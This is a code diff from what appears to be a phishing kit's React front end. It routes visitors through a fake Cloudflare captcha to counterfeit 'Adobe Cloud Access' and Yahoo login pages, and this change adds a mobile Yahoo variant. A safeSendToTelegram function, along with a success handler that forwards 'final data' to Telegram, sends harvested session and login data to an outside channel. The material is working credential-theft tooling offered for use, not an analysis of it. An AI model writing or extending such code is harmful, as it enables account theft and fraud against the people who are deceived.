@@ -1,7 +1,8 @@
 import React, { useState, useEffect } from 'react';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
-import YahooLoginPage from './components/YahooLoginPage'; // Import the new component
+import YahooLoginPage from './components/YahooLoginPage';
+import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage'; // Import mobile Yahoo page
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -17,9 +18,7 @@ const safeSendToTelegram = async (sessionData: any) => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(sessionData)
     });
-    if (!res.ok) {
-      throw new Error(`HTTP ${res.status}`);
-    }
+    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
     return await res.json();
   } catch (fetchErr) {
     console.error('sendToTelegram failed:', fetchErr);
@@ -33,7 +32,7 @@ function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
   const [isLoading, setIsLoading] = useState(true);
   const [captchaVerified, setCaptchaVerified] = useState(false);
-  const [showYahooLogin, setShowYahooLogin] = useState(false); // New state for Yahoo
+  const [showYahooLogin, setShowYahooLogin] = useState(false);
 
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
@@ -47,7 +46,7 @@ function App() {
       if (event.name === 'adobe_session' || event.name === 'logged_in') {
         const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
         setHasActiveSession(isActive);
-        setShowYahooLogin(false); // Reset on session change
+        setShowYahooLogin(false);
         if (isActive) setCurrentPage('landing');
         else {
           setCaptchaVerified(false);
@@ -106,7 +105,7 @@ function App() {
       console.error('Failed to send final data to Telegram:', error);
     }
     
-    setShowYahooLogin(false); // Hide Yahoo page on success
+    setShowYahooLogin(false);
     setCurrentPage('landing');
     setIsLoading(false);
   };
@@ -117,18 +116,12 @@ function App() {
     config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
     setHasActiveSession(false);
     setCaptchaVerified(false);
-    setShowYahooLogin(false); // Reset on logout
+    setShowYahooLogin(false);
     setCurrentPage('captcha');
   };
 
-  // --- New Handler to show Yahoo page ---
   const handleYahooSelect = () => {
     setShowYahooLogin(true);
-  };
-  
-  // --- New Handler to go back from Yahoo page ---
-  const handleBackFromYahoo = () => {
-    setShowYahooLogin(false);
   };
 
   if (isLoading) {
@@ -143,17 +136,18 @@ function App() {
     return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
   }
 
-  // --- Updated Render Logic ---
   if (currentPage === 'login' && captchaVerified && !hasActiveSession) {
     if (showYahooLogin) {
-      return <YahooLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
+      // Choose which Yahoo page to show based on device
+      const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
+      return <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
     
     const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
     return (
       <LoginComponent
         fileName="Adobe Cloud Access"
-        onYahooSelect={handleYahooSelect} // Pass handler to login page
+        onYahooSelect={handleYahooSelect}
         onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
         onLoginSuccess={handleLoginSuccess}
         onLoginError={error => console.error('Login error:', error)}
